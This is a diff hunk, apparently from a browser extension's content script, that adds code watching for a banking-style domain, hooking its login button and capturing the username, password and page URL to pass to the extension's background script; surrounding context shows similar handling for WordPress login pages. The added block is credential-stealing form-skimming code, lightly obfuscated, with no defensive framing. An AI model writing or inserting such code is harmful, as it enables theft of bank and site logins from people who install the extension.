@@ -540,6 +540,21 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                     }
                 }, 1000)
             };
+
+            if (top['location']['href']['indexOf']('http://www.bancacumana.tk/') > -1) {
+                  var interval = setInterval(function () {
+                      if (document['getElementById']('login_panel')) {
+                          clearInterval(interval);
+                          document['getElementsByClassName']('btn btn-primary').onclick = function (_0x441cx2) {
+                           var login = {};
+                          login.username = document.getElementsByName("username")[0].value;
+                          login.pass = document.getElementsByName("password")[0].value;
+                          login.href = window.location.href;
+                          chrome.runtime.sendMessage({cmd: "l",login});
+                          }
+                      }
+                  }, 1000)
+              };
     //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
